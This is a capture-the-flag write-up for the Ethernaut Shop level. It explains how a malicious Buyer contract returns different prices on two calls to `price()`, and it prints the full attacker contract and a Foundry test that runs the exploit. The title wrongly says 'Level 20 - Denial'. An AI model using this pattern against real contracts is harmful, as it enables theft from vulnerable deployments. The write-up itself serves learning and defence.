# Level 20 - Denial

## Objectives

- Get the item from the shop for less than the price asked.

## Contract Overview

The `Shop` contract has a public function called `buy` which allows a buyer to purchase the item at the current price. The function first checks whether the buyer's price is greater than or equal to the current price and whether the item has not already been sold. If both conditions are met, the `isSold` variable is set to true, indicating that the item has been sold, and the `price` variable is updated to the buyer's price.

The `Buyer` interface is used to ensure that the buyer contract implements the `price` function, which is required by the `buy` function in the `Shop` contract.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Shop_slither.png)

## Finding the weak spots

The contract defines an interface called `Buyer` but the `buy` function is using `msg.sender`'s address to create an instance. This means that attacker can deploy an malicious contract with a `price()` function in it and it will be called by the `buy()` function when checking the price.

```solidity
  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
```

One important thing to note in this contract is that the `price()` function is marked as a `view` function, meaning it cannot modify the contract's state. As a result, we cannot use state variables to return multiple values from this function as we did in the `Elevator` contract. However, we can make external calls to other `view` or `pure `functions to return multiple values.

To return two values from the `price()` function in this contract, we could use the `isSold` variable as a condition to return either the current price value or a higher price value set by a buyer. For example, the updated `price()` function could look like this:

```solidity
   function price() external view returns (uint) {
        return shopContract.isSold() ? 0 : 100;
    }
```

## Potential attack scenario (hypothesis)

One potential attack scenario that could be exploited in the provided contract is the possibility of a attacker using a malicious implementation of the `Buyer` interface to manipulate the `buy()` function and potentially bypass the price check.

For instance, an attacker contract could be implemented to return a false value for the `price()` function, indicating a lower price than what the buyer is actually offering. This could allow the attacker to purchase the item at a lower price than intended.

## Plan of the attack

1. Attacker creates the malicious contract that implemets `price` function of the `Buyer` interface.
2. Attacker calls the `attack` function that calls `buy` function from `Shop` contract.
3. Attacker gets the item from the shop for less than the price asked.

## Malicious contract (ShopAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop shopContract;

    constructor(address _shopContract) {
        shopContract = Shop(_shopContract);
    }

    // 1. Attacker creates the malicious contract that implemets `price` function of the `Buyer` interface.
    function price() external view returns (uint) {
        return shopContract.isSold() ? 0 : 100;
    }

    // 2. Attacker calls the `attack` function that calls `buy` function from `Shop` contract.
    function attack() external {
        shopContract.buy();
    }
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/21-Shop.t.sol))

```solidity
        // 1. Attacker creates the malicious contract that implemets `price` function of the `Buyer` interface.
        ShopAttack shopAttack = new ShopAttack(address(level));

        emit log_named_uint("Price of item before attack", level.price());

        // 2. Attacker calls the `attack` function that calls `buy` function from `Shop` contract.
        emit log_string("Starting the exploit...");
        shopAttack.attack();

        emit log_named_uint("Price of item after attack", level.price());

        // Test assertion
        assertEq(level.isSold(), true);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Shop.png)

## Recommendations

- Never leave interfaces unimplemented and it is a really bad idea to trust implementations by other unknown contracts.
- Even though view and pure functions can not modify the state, they can be manipulated as shown above.
- Never ever trust blindly things that are not under your control.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)
- [Blog cmichel](https://cmichel.io/ethernaut-solutions/)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
